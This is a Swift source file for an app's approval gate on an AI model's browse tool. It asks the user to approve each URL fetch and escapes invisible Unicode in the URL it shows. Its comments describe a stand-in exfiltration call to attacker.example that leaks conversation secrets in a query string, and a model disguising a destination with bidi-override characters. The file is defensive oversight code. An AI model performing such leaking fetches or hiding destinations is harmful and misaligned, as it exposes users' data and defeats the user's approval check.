import Foundation
import Observation

/// Per-invocation approval gate for the ``browse`` action tool.
///
/// A URL fetch is not harmless: the model chooses the URL, so a plain
/// `browse("https://attacker.example/?leak=<secrets>")` would exfiltrate
/// conversation data to a public host that no SSRF check can block (the host
/// *is* public). The only real defence is that the user SEES and approves the
/// exact URL before any request runs. The prompt offers "Allow once" or
/// "Always allow"; the latter enables the same persisted, coarse browsing mode
/// exposed in Settings. Private and local destinations remain blocked by the
/// SSRF guard in either mode. Default is ``Mode/ask``.
@MainActor
@Observable
final class BrowseApprovalStore {
    enum Mode: String {
        case ask
        case autoApproveAll
    }

    enum Decision: Equatable {
        case allowOnce
        /// The USER said no — the sheet's "Don't allow", or dismissing it.
        case deny
        /// The question was never put to the user: the tool call was cancelled
        /// before (or while) the sheet was up, or a prompt was already open.
        /// Distinct from ``deny`` because nobody decided anything, and the
        /// difference is user-visible — a decline is reported as an ordinary
        /// outcome the user chose, while this is not something to attribute to
        /// them. See ``FailureDiagnosis.Kind.userDeclined``.
        case unavailable
    }

    /// A pending prompt the UI surfaces as a confirm dialog.
    struct PendingApproval: Equatable {
        /// Single-lined, length-capped preview of the URL.
        let url: String
        /// The COMPLETE, untruncated URL. The sheet renders this (display-safe)
        /// so a model can't hide the real destination past a preview cap.
        let fullURL: String
        /// The host, surfaced prominently so the user judges *where* the request
        /// goes without parsing a long query string.
        let host: String
    }

    static let modeKey = "rapid.tools.browse.mode.v1"

    private let defaults: UserDefaults

    var mode: Mode {
        didSet {
            guard mode != oldValue else { return }
            defaults.set(mode.rawValue, forKey: Self.modeKey)
        }
    }

    private(set) var pendingRequest: PendingApproval?
    private var pendingContinuation: CheckedContinuation<Decision, Never>?
    private var pendingRequestWaiters: [UUID: PendingRequestWaiter] = [:]

    init(defaults: UserDefaults = .standard) {
        self.defaults = defaults
        self.mode = Mode(rawValue: defaults.string(forKey: Self.modeKey) ?? "") ?? .ask
    }

    /// Gate a URL fetch. Returns immediately when auto-approve is on; otherwise
    /// suspends until the UI answers.
    func requestApproval(url: String, host: String) async -> Decision {
        if mode == .autoApproveAll { return .allowOnce }
        // Re-entrancy guard — tool execution is serial, so a second pending
        // request means something is wrong; refuse rather than hang. NOT a
        // decline: the user was never shown this URL.
        if pendingRequest != nil { return .unavailable }
        return await withTaskCancellationHandler {
            await withCheckedContinuation { (continuation: CheckedContinuation<Decision, Never>) in
                // Cancellation can land between the re-entrancy check above and
                // here; the onCancel handler would then have found no
                // continuation to resume. Re-check inside the body so we bail
                // immediately instead of installing a pending request that would
                // surface an orphaned, never-answerable sheet.
                if Task.isCancelled {
                    continuation.resume(returning: .unavailable)
                    return
                }
                self.pendingContinuation = continuation
                self.pendingRequest = PendingApproval(
                    url: Self.previewLine(url),
                    fullURL: url,
                    host: host
                )
                let waiters = Array(self.pendingRequestWaiters.values)
                self.pendingRequestWaiters.removeAll()
                waiters.forEach { $0.resolve(true) }
            }
        } onCancel: { [weak self] in
            Task { @MainActor [weak self] in
                guard let self else { return }
                if let cont = self.pendingContinuation {
                    self.pendingContinuation = nil
                    self.pendingRequest = nil
                    // The sheet is being torn down because the turn was
                    // cancelled, not because the user turned it down.
                    cont.resume(returning: .unavailable)
                }
            }
        }
    }

    /// Suspend until an approval prompt has been published.
    ///
    /// This is a lifecycle observation seam for deterministic callers such as
    /// tests: it observes the same ``pendingRequest`` state the UI renders,
    /// without guessing when publication happened from sleeps or deadlines.
    /// Returns `false` when the observer itself is cancelled first.
    func waitUntilPendingRequest(onWaiting: (() -> Void)? = nil) async -> Bool {
        if pendingRequest != nil { return true }
        let waiterID = UUID()
        let waiter = PendingRequestWaiter()
        return await withTaskCancellationHandler {
            await withCheckedContinuation { continuation in
                pendingRequestWaiters[waiterID] = waiter
                if waiter.attach(continuation) {
                    onWaiting?()
                } else {
                    pendingRequestWaiters.removeValue(forKey: waiterID)
                }
            }
        } onCancel: { [weak self, waiter] in
            // Settle immediately on the cancelling thread. The actor hop below
            // is only dictionary cleanup, so a later publication cannot beat a
            // cancellation that has already won the once-only waiter state.
            waiter.resolve(false)
            Task { @MainActor [weak self] in
                self?.cancelPendingRequestWaiter(waiterID)
            }
        }
    }

    private func cancelPendingRequestWaiter(_ waiterID: UUID) {
        pendingRequestWaiters.removeValue(forKey: waiterID)
    }

    /// Called by the SwiftUI dialog with the user's choice; resumes the tool.
    func answer(_ decision: Decision) {
        guard pendingRequest != nil else { return }
        pendingRequest = nil
        pendingContinuation?.resume(returning: decision)
        pendingContinuation = nil
    }

    /// Approve the pending fetch and remember that future public web fetches
    /// should not prompt. This deliberately reuses ``mode`` rather than keeping
    /// a second preference that could drift from the Settings toggle.
    func alwaysAllow() {
        guard pendingRequest != nil else { return }
        mode = .autoApproveAll
        answer(.allowOnce)
    }

    /// Collapse a URL to a single capped line for the dialog body. Explicit
    /// char loop (no closure over the collection — the
    /// SIGTRAP-in-optimized-swift-test class) collecting up to `cap` visible
    /// chars; interior newlines/tabs flatten to spaces.
    static func previewLine(_ raw: String, cap: Int = 300) -> String {
        var out = ""
        out.reserveCapacity(cap + 1)
        var started = false
        var truncated = false
        for ch in raw {
            let isWhitespace = ch == " " || ch == "\n" || ch == "\r" || ch == "\t"
            if !started {
                if isWhitespace { continue }
                started = true
            }
            if out.count >= cap { truncated = true; break }
            out.append(isWhitespace ? " " : ch)
        }
        while out.last == " " { out.removeLast() }
        return truncated ? out + "…" : out
    }

    /// Make a string SAFE to show in the approval sheet. A model can hide the
    /// real destination behind invisible Unicode — bidi overrides (U+202E …)
    /// can visually reorder text so `evil.example` renders as if it were a
    /// trusted host, and other format / control scalars are zero-width. The
    /// fetch uses the raw bytes; the user must see them too. Every control /
    /// format / line-separator scalar (except the legitimately-visible tab and
    /// newline) is rendered as a `\u{XXXX}` escape so nothing can reorder or
    /// hide.
    static func displaySafe(_ raw: String) -> String {
        var out = ""
        out.reserveCapacity(raw.count + 8)
        for scalar in raw.unicodeScalars {
            if scalar == "\n" || scalar == "\t" {
                out.unicodeScalars.append(scalar)
                continue
            }
            switch scalar.properties.generalCategory {
            case .control, .format, .lineSeparator, .paragraphSeparator,
                 .privateUse, .surrogate, .unassigned:
                out += String(format: "\\u{%04X}", scalar.value)
            default:
                out.unicodeScalars.append(scalar)
            }
        }
        return out
    }
}

/// Once-only bridge between an approval publication and observer cancellation.
/// Either side may arrive before the continuation is attached, and either may
/// run off the main actor; the lock preserves the first outcome in both cases.
private final class PendingRequestWaiter: @unchecked Sendable {
    private let lock = NSLock()
    private var continuation: CheckedContinuation<Bool, Never>?
    private var result: Bool?

    /// Returns whether the continuation remains suspended after attachment.
    func attach(_ continuation: CheckedContinuation<Bool, Never>) -> Bool {
        lock.lock()
        if let result {
            lock.unlock()
            continuation.resume(returning: result)
            return false
        }
        self.continuation = continuation
        lock.unlock()
        return true
    }

    func resolve(_ result: Bool) {
        lock.lock()
        guard self.result == nil else {
            lock.unlock()
            return
        }
        self.result = result
        let continuation = continuation
        self.continuation = nil
        lock.unlock()
        continuation?.resume(returning: result)
    }
}
